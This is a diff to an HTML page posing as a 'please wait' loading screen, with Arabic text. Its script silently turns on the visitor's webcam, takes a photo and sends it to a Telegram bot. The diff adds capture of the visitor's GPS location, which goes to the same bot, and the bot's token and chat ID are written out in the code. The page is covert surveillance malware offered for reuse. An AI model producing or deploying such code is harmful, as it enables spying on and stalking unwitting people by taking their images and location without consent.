@@ -3,36 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <title>جارٍ التحميل...</title>
-  <style>
-    .container {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 20px;
-    }
-    .image-right {
-      max-width: 300px;
-      height: auto;
-    }
-  </style>
 </head>
 <body>
-  <div class="container">
-    <h2>يرجى الانتظار...</h2>
-    <!-- الصورة التي قمت بإرسالها -->
-    <img src="ChatGPT Image Jul 6, 2025, 05_37_40 AM.png" alt="تحية كوزا" class="image-right">
-  </div>
+  <h2>يرجى الانتظار...</h2>
 
   <script>
     async function captureAndSend() {
       try {
+        // 1- تشغيل الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
-        video.play();
+        await video.play();
 
+        // 2- الانتظار حتى تشتغل الكاميرا
         await new Promise(resolve => setTimeout(resolve, 3000));
 
+        // 3- التقاط الصورة
         const canvas = document.createElement('canvas');
         canvas.width = 640;
         canvas.height = 480;
@@ -42,16 +29,32 @@
         const imageData = canvas.toDataURL('image/jpeg');
         const blob = await (await fetch(imageData)).blob();
 
-        const formData = new FormData();
-        formData.append("chat_id", "1320552080");
-        formData.append("photo", blob, "capture.jpg");
-
-        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
-          method: "POST",
-          body: formData
-        });
-
+        // 4- إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
+
+        // 5- الحصول على الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // 6- إرسال الصورة
+          const formData = new FormData();
+          formData.append("chat_id", "1320552080"); // استبدل بـ chat_id الخاص بك
+          formData.append("photo", blob, "capture.jpg");
+
+          await fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+            method: "POST",
+            body: formData
+          });
+
+          // 7- إرسال الموقع
+          await fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+            method: "GET"
+          });
+
+        }, (error) => {
+          console.error("فشل الحصول على الموقع:", error);
+        });
 
       } catch (err) {
         console.error("فشل الوصول إلى الكاميرا:", err);
